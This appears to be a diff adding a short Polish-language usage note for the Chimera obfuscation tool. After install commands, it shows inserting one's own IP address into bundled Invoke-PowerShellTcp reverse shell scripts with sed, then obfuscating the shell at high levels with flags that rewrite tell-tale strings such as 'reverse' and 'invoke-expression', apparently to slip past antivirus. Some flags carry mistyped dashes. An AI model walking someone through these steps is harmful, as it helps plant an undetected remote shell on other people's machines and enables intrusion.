@@ -1,0 +1,27 @@
+Opis:
+Program do obfuskacji (zaciemniania kodu itp.)
+
+ 
+Instalacja:
+→ apt-get update
+→ apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
+→ git clone https://github.com/tokyoneon/chimera /opt/chimera
+→ chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
+→ chmod +x chimera.sh; ./chimera.sh –help
+
+
+Example:
+Wyswietlenie skryptu:  
+[/opt/chimera] → cat ./shells/Invoke-PowerShellTcp.ps1
+
+Zamienienie adresu ip znajdujacego sie w wszystkich skryptach na nasz adres ip:
+[/opt/chimera] → sed -i 's/<stary_ip>/<nasz_ip>/g' ./shells/*.ps1
+
+Zaciemnienie pliku (level 5):
+[/opt/chimera] → ./chimera.sh -–file shells/Invoke-PowerShellTcp.ps1 -l 5 -–output ~/Desktop/dupa.ps1
+
+[/opt/chimera] → ./chimera.sh -–file shells/Invoke-PowerShellTcp.ps1 -l 5 --output dupa.ps1  -v -t powershell,windows,copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,invoke-expression,out-string,write-error -j -g -k -r -p
+
+Zaciemnienie wszystkimi mozliwymi opcjami:
+[/opt/chimera] → ./chimera.sh --file <plik> --all --output <fil_out>
+
